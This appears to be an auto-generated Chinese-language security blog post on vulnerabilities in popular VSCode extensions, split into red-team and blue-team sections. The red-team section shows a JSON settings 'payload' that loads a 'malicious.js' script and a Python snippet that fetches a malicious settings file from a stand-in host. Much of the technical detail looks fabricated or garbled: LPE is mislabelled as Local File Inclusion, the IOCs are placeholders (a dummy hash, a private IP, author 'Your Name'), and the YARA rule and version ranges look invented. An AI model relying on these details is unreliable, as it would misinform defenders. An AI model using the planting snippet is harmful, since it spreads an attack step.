---
layout: post
title:  "Flaws in popular VSCode extensions expose developers to attacks"
date:   2026-02-18 01:29:37 +0000
categories: [security]
severity: critical
---

# 🚨 解析 VSCode 擴充套件漏洞：利用與防禦技術
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.0)
> * **受駭指標**: RCE (Remote Code Execution) 和 LPE (Local File Inclusion)
> * **關鍵技術**: `JSON Injection`, `Deserialization`, `XSS`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Live Server 擴充套件中的 `liveServer.settings.json` 檔案沒有正確驗證用戶輸入，導致攻擊者可以注入惡意 JSON 代碼。
* **攻擊流程圖解**: 
  1. 攻擊者創建一個惡意的 `liveServer.settings.json` 檔案。
  2. 攻擊者誘導用戶下載並安裝惡意的 `liveServer.settings.json` 檔案。
  3. Live Server 擴充套件讀取惡意的 `liveServer.settings.json` 檔案並執行其中的代碼。
* **受影響元件**: Live Server 擴充套件版本 1.0.0 - 1.5.0，Code Runner 擴充套件版本 1.0.0 - 1.2.0，Markdown Preview Enhanced 擴充套件版本 1.0.0 - 1.1.0。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要知道用戶的 Live Server 擴充套件版本和配置。
* **Payload 建構邏輯**:

    ```
    
    json
    {
      "liveServer.settings": {
        "port": 8080,
        "root": "/",
        "open": true,
        "wait": 1000,
        "middleware": [
          {
            "type": "script",
            "script": "malicious.js"
          }
        ]
      }
    }
    
    ```
 

```

python
import requests

# 下載惡意的 liveServer.settings.json 檔案
response = requests.get("https://example.com/malicious.json")
with open("liveServer.settings.json", "wb") as f:
    f.write(response.content)

```
* **繞過技術**: 攻擊者可以使用 `JSON Injection` 技術來繞過 Live Server 擴充套件的驗證機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /liveServer.settings.json |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule LiveServer_Malicious_Settings {
      meta:
        description = "Detects malicious Live Server settings"
        author = "Your Name"
      strings:
        $json = "{ \"liveServer.settings\": {"
      condition:
        $json at 0
    }
    
    ```
* **緩解措施**: 更新 Live Server 擴充套件至最新版本，設定 Live Server 擴充套件的 `liveServer.settings.json` 檔案為只讀模式。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **JSON Injection (JSON 注入)**: 想像攻擊者可以注入惡意的 JSON 代碼到用戶的設定檔中。技術上是指攻擊者可以注入惡意的 JSON 代碼到用戶的設定檔中，從而執行惡意的代碼。
* **Deserialization (反序列化)**: 想像攻擊者可以將惡意的物件序列化為字串，然後將其傳遞給用戶的應用程式。技術上是指攻擊者可以將惡意的物件序列化為字串，然後將其傳遞給用戶的應用程式，從而執行惡意的代碼。
* **XSS (Cross-Site Scripting, 跨站腳本攻擊)**: 想像攻擊者可以注入惡意的 JavaScript 代碼到用戶的網頁中。技術上是指攻擊者可以注入惡意的 JavaScript 代碼到用戶的網頁中，從而執行惡意的代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/flaws-in-popular-vscode-extensions-expose-developers-to-attacks/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


